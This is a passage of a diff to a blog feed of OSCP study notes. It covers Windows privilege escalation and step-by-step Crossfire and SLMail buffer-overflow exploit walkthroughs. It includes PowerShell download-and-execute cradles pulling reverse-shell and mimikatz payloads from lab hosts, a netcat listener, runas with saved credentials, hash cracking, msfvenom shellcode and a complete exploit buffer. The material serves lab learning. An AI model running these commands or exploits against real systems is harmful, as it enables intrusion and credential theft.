class="n"&gt;pwdump&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Is there python on dev windows machine
+Use pyinstaller on dev windows machine&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="n"&gt;pyinstaller&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-onefile&lt;/span&gt; &lt;span class="n"&gt;ms11&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;080&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Check for powershell&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;powershell&lt;/span&gt; &lt;span class="n"&gt;whoami&lt;/span&gt;
+&lt;span class="n"&gt;whaomi&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;priv&lt;/span&gt;
+&lt;span class="n"&gt;cmdkey&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;run exploit suggesters&lt;/p&gt;
+&lt;p&gt;If web server poke around database&lt;/p&gt;
+&lt;p&gt;Check if I can write in a folder&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="n"&gt;PleaseSubsribe&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;test&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Nishang&lt;/li&gt;
+&lt;li&gt;unicorn gives a meterpreter from a standard shell
+UPGRADE TO NISHANG 1. Locate the PS &amp;gt; Invoke...reverse shell line in script and put at bottom so it executes in memory after transfer&lt;/li&gt;
+&lt;li&gt;Server &lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;powershell &lt;code&gt;IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')&lt;/code&gt;
+&lt;code&gt;net user dan dan /add; net local&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;UNICORN&lt;/h2&gt;
+&lt;p&gt;Can't remember what this was now, look up...&lt;/p&gt;
+&lt;h2&gt;Exploit suggester&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;./windows-exploit-suggester.py&lt;/li&gt;
+&lt;li&gt;python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt&lt;/li&gt;
+&lt;li&gt;jaws-enum.ps1&lt;/li&gt;
+&lt;li&gt;Sherlock.ps1&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Empire&lt;/h2&gt;
+&lt;p&gt;Can't remember what this was now, look up...
+- PowerUp.ps1 # service misconfigs
+locate PowerUp.ps1. Copy then add "Invoke-AllChecks" to end
 http://10.10.10.9/ippsec.php?fexec=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.11:8000/
-PowerUp.ps1%27)%20|%20powershell%20-noprofile%20-
-Run Invokes from memory as the file transferred
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
+PowerUp.ps1%27)%20|%20powershell%20-noprofile%20- Run Invokes from memory as the file transferred&lt;/p&gt;
+&lt;h2&gt;JAWS&lt;/h2&gt;
+&lt;p&gt;powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
 1. jaws-enum.ps1 JAWS enumeration
 Currently stored credentials:
 Target: Domain:interactive=ACCESS\Administrator
@@ -680,11 +901,11 @@ JAWS enumeration
 Currently stored credentials:
 Target: Domain:interactive=ACCESS\Administrator
 Type: Domain Password
-User: ACCESS\Administrator
-PS C:\Users\Public\Desktop&amp;gt; dir
-"ZKAccess3.5 Security System.lnk"
-GET FILE CONTENTS SO WE KNOW HOW TO RUN AS ADMIN
-get-Content "ZKAccess3.5 Security System.lnk" == linux “file”
+User: ACCESS\Administrator&lt;/p&gt;
+&lt;p&gt;PS C:\Users\Public\Desktop&amp;gt; dir
+"ZKAccess3.5 Security System.lnk"&lt;/p&gt;
+&lt;p&gt;GET FILE CONTENTS SO WE KNOW HOW TO RUN AS ADMIN
+get-Content "ZKAccess3.5 Security System.lnk" == linux "file"
 $WScript = New-Object -ComObject Wscript.Shell
 $shortcut = Get-ChildItem *.lnk
 $Wscript.CreateShortcut($shortcut)
@@ -712,9 +933,9 @@ SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A
 Set up listener on KALI
 nc -nlvp 9002
 runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand
-SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB
-Use mimikatz
-Need write access to download, go to your users desktop
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB&lt;/p&gt;
+&lt;h3&gt;Use mimikatz&lt;/h3&gt;
+&lt;p&gt;Need write access to download, go to your users desktop
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.7:8000/mimikatz.exe', 'mimkatz.exe')
 didnt work
 tried from telnet sessiondir
@@ -731,8 +952,9 @@ Mode LastWriteTime Length Name&lt;/p&gt;
 &lt;p&gt;d---- 8/21/2018 11:30 PM aspnet_cli
 ent
 -a--- 8/24/2018 12:33 AM 391 index.html
--a--- 8/24/2018 8:39 PM 88712 out.jpg
-PASSWORDS cmdkey /list - is a stored pw
+-a--- 8/24/2018 8:39 PM 88712 out.jpg&lt;/p&gt;
+&lt;h2&gt;PASSWORDS&lt;/h2&gt;
+&lt;p&gt;cmdkey /list - is a stored pw
 Currently stored credentials:
 Target: Domain:interactive=ACCESS\Administrator
 Type: Domain Password
@@ -752,82 +974,94 @@ https://crackstation.net
 https://hashkiller.co.uk
 john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Linux Buffer Overflow</title><link href="/linux-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/linux-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
-&lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
-&lt;h3&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h3&gt;
-&lt;p&gt;iptables –A, -p, -d, -j # Append, protocol, destination, jump
-crossfire listens on port 13327
-iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
-&lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
-&lt;h3&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h3&gt;
-&lt;p&gt;iptables –A, -p, -d, -j # Append, protocol, destination, jump
-crossfire listens on port 13327
-iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
-iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;Run debugger and crash the app
-Get POC code from exploit db
-edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
-crash = “\x41” *4379
-buffer = “\x11(setup sound “ + crash + “\x90\x00#”
-python fuzz.py&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Control EIP
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
-Swap into the crash var: python linux_buffer_overflow.py 
+https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Linux Buffer Overflow (Crossfire)</title><link href="/linux-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/linux-buffer-overflow.html</id><summary type="html">&lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
+&lt;h2&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables –A, -p, -d, -j &lt;span class="c1"&gt;# Append, protocol, destination, jump&lt;/span&gt;
+crossfire listens on port &lt;span class="m"&gt;13327&lt;/span&gt;
+iptables -A INPUT -p tcp --destination-port &lt;span class="m"&gt;13327&lt;/span&gt; &lt;span class="se"&gt;\!&lt;/span&gt; -d &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 -j DROP
+iptables -A INPUT …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
+&lt;h2&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables –A, -p, -d, -j &lt;span class="c1"&gt;# Append, protocol, destination, jump&lt;/span&gt;
+crossfire listens on port &lt;span class="m"&gt;13327&lt;/span&gt;
+iptables -A INPUT -p tcp --destination-port &lt;span class="m"&gt;13327&lt;/span&gt; &lt;span class="se"&gt;\!&lt;/span&gt; -d &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 -j DROP
+iptables -A INPUT -p tcp --destination-port &lt;span class="m"&gt;4444&lt;/span&gt; &lt;span class="se"&gt;\!&lt;/span&gt; -d &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Run debugger and crash the app&lt;/h2&gt;
+&lt;p&gt;Get POC code from exploit db&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;crash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x41&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;4379&lt;/span&gt;
+&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x11&lt;/span&gt;&lt;span class="s2"&gt;(setup sound &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;crash&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90\x00&lt;/span&gt;&lt;span class="s2"&gt;#&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python fuzz.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Control EIP&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;span class="m"&gt;4379&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Swap into the crash var: python linux_buffer_overflow.py 
 EIP has been overwritten with the hex characters… 46 36 70 46
-These are unique 4 bytes in the buffer. Now find where they are in the buffer.
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
-[*] Exact match at offset 4368
-Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Make space for the shellcode&lt;br&gt;
-Check for helpful registers: Follow in dump.
-EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
-ESP points to end of buffer “C * 7” (spare bytes). 
-Add 12 bytes to EAX to align EAX with the A’s =&amp;gt; JMP EAX we skip over “setup sound “
-/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+These are unique 4 bytes in the buffer. Now find where they are in the buffer.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l &lt;span class="m"&gt;4379&lt;/span&gt; -q &lt;span class="m"&gt;46367046&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exact match at offset &lt;span class="m"&gt;4368&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Replace: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;crash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x41&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4368&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;: python EIP_BBBB.py&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Make space for the shellcode&lt;/h2&gt;
+&lt;p&gt;Check for helpful registers: Follow in dump.
+EAX points to buffer start "setup sound " opstring (len 12). Want to avoid these bytes. 
+ESP points to end of buffer "C * 7" (spare bytes). 
+Add 12 bytes to EAX to align EAX with the A's =&amp;gt; JMP EAX we skip over "setup sound"&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm &amp;gt; add eax,12   83C00C add eax,byte +0xc
 nasm &amp;gt; jmp eax      FFE0 jmp eax
-Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Discover bad characters
-All bad chars (except x00) contained in deault named script. Can use this for future.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. 
+Looks like I didn’t test again here? Just note nasm output and move on?&lt;/p&gt;
+&lt;h2&gt;Discover bad characters&lt;/h2&gt;
+&lt;p&gt;All bad chars (except x00) contained in deault named script. Can use this for future.
 python bad_chars.py
 ID/remove bad chars in buffer. Right-click EAX. Follow in stack &amp;amp; dump. Stack looked better in EDBG. Scroll down dump until end of A’s. Then should see 01, 02, 03… etc until a failure. remove failure from bad_chars.py. Redo until ESP-error-free crash 
 Removed: (\x00\x0a\x0d\x20)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Redirect execution flow - Find a return address
-So, we know we want to reach the buffer pointed to by the ESP register.
+&lt;h2&gt;Redirect execution flow - Find a return address&lt;/h2&gt;
+&lt;p&gt;So, we know we want to reach the buffer pointed to by the ESP register.
 EDBG: Plugins: Opcode Seacher: 
 Once the application is in a crashed state use dropdown to search for:
 ESP -&amp;gt; EIP: 
-Choose 1st JMP ESP. Add address to python script at BBBB.
-crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90“
-EDBG: Add breakpoint at 0x08134597 to execution flow. 
+Choose 1st JMP ESP. Add address to python script at BBBB.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;crash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x41&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4368&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x97\x45\x13\x08&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x83\xc0\x0c\xff\xe0\x90\x90&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;EDBG: Add breakpoint at 0x08134597 to execution flow. 
 Right-click Go to Address 0x08134597. Double click on it to place breakpoint.
 Restart EDBG. Send payload. Should pause at First stage payload.
 Next instruction is JMP ESP. F8. We are redirected to ESP 83C00C 
-As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A’s&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;Make shellcode excluding bad characters
-bind or reverse? why?
-msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c –b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
-Resulting shell code is 105 bytes&lt;/li&gt;
-&lt;li&gt;Add shellcode into python script
-shellcode = ("\xd9... \x30")
-ret="\x97\x45\x13\x08”
-crash=shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90“
-buffer = "\x11(setup sound " + crash + "\x90\x00#“
-TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
-python exploit.py
-id; whoami&lt;/li&gt;
-&lt;/ol&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Windows Buffer Overflow</title><link href="/windows-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/windows-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
+As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A's&lt;/p&gt;
+&lt;h2&gt;Make shellcode excluding bad characters&lt;/h2&gt;
+&lt;p&gt;bind or reverse? why?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p linux/x86/shell_bind_tcp &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f c –b &lt;span class="s2"&gt;&amp;quot;\x00\x0a\x0d\x20&amp;quot;&lt;/span&gt; –e x86/shikata_ga_nai
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Resulting shell code is 105 bytes&lt;/p&gt;
+&lt;h2&gt;Add shellcode into python script&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xd9&lt;/span&gt;&lt;span class="s2"&gt;\... &lt;/span&gt;&lt;span class="se"&gt;\x30&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x97\x45\x13\x08&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;crash&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x41&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4368&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;105&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x83\xC0\x0C\xFF\xE0\x90\x90&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x11&lt;/span&gt;&lt;span class="s2"&gt;(setup sound &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;crash&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90\x00&lt;/span&gt;&lt;span class="s2"&gt;#&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python exploit.py
+id&lt;span class="p"&gt;;&lt;/span&gt; whoami
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Windows Buffer Overflow</title><link href="/windows-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/windows-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
 &lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
 &lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are available on Exploit Database (&lt;a href="https://www.exploit-db.com/exploits/638"&gt;exploit&lt;/a&gt;)!&lt;/p&gt;
 &lt;p&gt;You will have to jump between your Kali machine (to tweak your exploit) and the Windows VM (to restart SLMail after each crash and analyze the crash in Immunity Debugger) You will need &lt;a href="https://www.immunityinc.com/products/debugger/"&gt;Immunity Debugger&lt;/a&gt; to help develop your exploit.&lt;/p&gt;
@@ -872,7 +1106,7 @@ Open Immunity Debugger and attach SLMail to it; Make sure that Immunity debugger
 &lt;h3&gt;2. Control EIP&lt;/h3&gt;
 &lt;p&gt;Next we need to locate the exact bytes at which the Extended Instruction Pointer (EIP) is overwritten. The EIP tells the computer where in memory to execute the next command. If we can find where the EIP is we can exchange those bytes at the EIP with a memory address containing our reverse shellcode. So, instead of sending a string of 2700 &lt;strong&gt;A&lt;/strong&gt;s, we send a specially crafted string of 2700 characters. Each sequence of 4 letters in this string is unique. We can simply determine how far along the 2700 charcaters the unique 4 letter overwrite the EIP. 
 2a. We use a Metasploit script to generate the unique string as follows:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;span class="m"&gt;2700&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We swap out the buffer in the python script. Prior to resending the exploit we have to restart SLMail on the target and reattach to Immunity debugger. This will be the case after each exploit attempt. Now we resend with the following buffer...&lt;/p&gt;
@@ -913,21 +1147,20 @@ Immunity debugger can execute certain modules to help find JMP ESPs in memory as
 1. No memory protection such as DEP and ASLR. 
 2. No bad characters in memory range.&lt;/p&gt;
 &lt;p&gt;With SLMail running. Into the Immunity debugger command line enter:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="sx"&gt;!mona modules&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;!mona modules
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;!mona&lt;/strong&gt; module identified the SLMFC.DLL as not being affected by any memory protection schemes and not being rebased on each reboot. Therefore, the DLL will always load to same address. Use mona again to find a JMP ESP (or equivalent opcode) instruction within this DLL, and identify its memory address.&lt;br&gt;
 In Immunity Debugger:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;Use Metasploit NASM Shell ruby script to find the opcode for jmp esp.&lt;/span&gt;
-&lt;span class="err"&gt;```bash&lt;/span&gt;
-&lt;span class="err"&gt;/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb &lt;/span&gt;
-&lt;span class="err"&gt;nasm &amp;gt; jmp esp &lt;/span&gt;
-&lt;span class="err"&gt;FFE4&lt;/span&gt;
+&lt;p&gt;Use Metasploit NASM Shell ruby script to find the opcode for jmp esp.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+nasm &amp;gt; jmp esp 
+FFE4
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Now search addresses for FFE4. Remember the memory address needs to be free of bad characters. 
 Back in Immunity Debugger command line.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="sx"&gt;!mona find –s “\xff\xe4” –m slmfc.dll&lt;/span&gt;
